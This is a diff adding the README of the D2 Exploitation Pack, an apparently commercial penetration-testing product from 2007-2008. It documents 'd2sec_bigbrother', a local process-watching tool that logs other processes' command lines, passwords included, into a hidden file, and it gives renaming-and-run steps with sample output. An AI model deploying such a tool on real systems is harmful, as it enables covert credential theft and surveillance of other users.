@@ -1,0 +1,47 @@
+D2 Exploitation Pack
+=====================
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+
+License information
+--------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+--------------
+
+d2sec_bigbrother might allow local users to list the processes and to
+survey arguments on command line. For example, it can be used against
+binaries showing passwords in the clear on the command line.
+
+It's not an evolved backdoor :
+- not hidden process
+- a weak encryption algorithm
+- not hidden key
+- etc
+
+It logs information in a file named /var/tmp/.zmanXXXX. To set binary to
+survey, you must set D2SEC environment variable, rename d2sec_bigbrother
+binary as you like and run it. The created process is attached to init
+process.
+
+For example:
+
+$ export D2SEC="foo" 
+$ cp d2sec_bigbrother blaat 
+$ ./blaat
+$ ps -ef | grep blaat
+compaq   14424     1 99 17:43 pts/6    00:00:05 ./blaat
+$ /tmp/foo bar
+$ ps -ef | grep blaat
+$ ls -alp /var/tmp/.zman*
+-rw------- 1 compaq compaq 77 mar 30 17:43 /var/tmp/.zmanj45Ii9
+$ ./d2sec_bigbrother -d /var/tmp/.zmanj45Ii9
+[#] date: Sun Mar 30 17:43:35 2008
+[#] pid: 14430
+[#] cmdline: /tmp/foo bar 
+
+See VULN file to supported vulnerabilities
